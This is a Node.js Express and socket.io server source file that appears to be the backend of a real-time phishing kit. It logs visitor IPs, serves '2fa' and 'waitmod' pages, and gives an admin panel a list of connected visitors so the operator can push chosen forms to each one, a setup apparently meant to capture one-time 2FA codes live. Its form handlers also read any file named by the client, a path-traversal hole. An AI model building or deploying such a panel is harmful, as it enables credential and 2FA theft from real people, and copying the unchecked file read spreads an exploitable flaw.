const express = require('express')

const bodyParser = require('body-parser')
const cors = require('cors')
const socket = require('socket.io')
const  SendIp  =require("./ip.controller.js");

const app = express()
const port = 3000

app.use(express.json());
app.use(cors());
const fs = require('fs');
const { log } = require('console');

const server = app.listen(port, () => console.log(`App listening on port ${port}!`))

const io = socket(server, {
    cors: {
        origin: "*",
        credentials: true,
    },
});

app.get('/', function (req, res) {
    res.sendFile(__dirname + "/index.html");
})
app.get('/admin', function (req, res) {
    res.sendFile(__dirname + "/admin.html");
})

global.onlineUsers = new Map();

var users = []
var count = 0;

app.post('/send/ip', SendIp);

app.get("/get2fa",(req,res)=>{
    const filePath = __dirname + "/" + "2fa.html";
    fs.readFile(filePath, 'utf8', (err, response) => {
        if (err) {
            console.error(err);
            return;
        }
        res.send(response)
    })

})
app.get("/getConfirm",(req,res)=>{
    const filePath = __dirname + "/" + "waitmod.html";
    fs.readFile(filePath, 'utf8', (err, response) => {
        if (err) {
            console.error(err);
            return;
        }
        res.send(response)
    })

})
io.on("connection", (socket) => {

    global.chatSocket = socket;

    users.push(socket.id)

    io.emit("admin", users);

    socket.on("disconnect", function () {

        users = users.filter(function (e) { return e !== socket.id })

        io.emit("admin", users);

    })

    socket.on("send-form", (data) => {
        const filePath = __dirname + "/" + data.form;
        fs.readFile(filePath, 'utf8', (err, res) => {
            if (err) {
                console.error(err);
                return;
            }
            socket.to(data.to).emit("form-receive", res)
        });
    })
    
 
    socket.on("send-form-all", (data) => {
        const filePath = __dirname + "/" + data.form;
        fs.readFile(filePath, 'utf8', (err, res) => {
            if (err) {
                console.error(err);
                return;
            }
            socket.broadcast.emit("form-receive", res)
        });
    })
});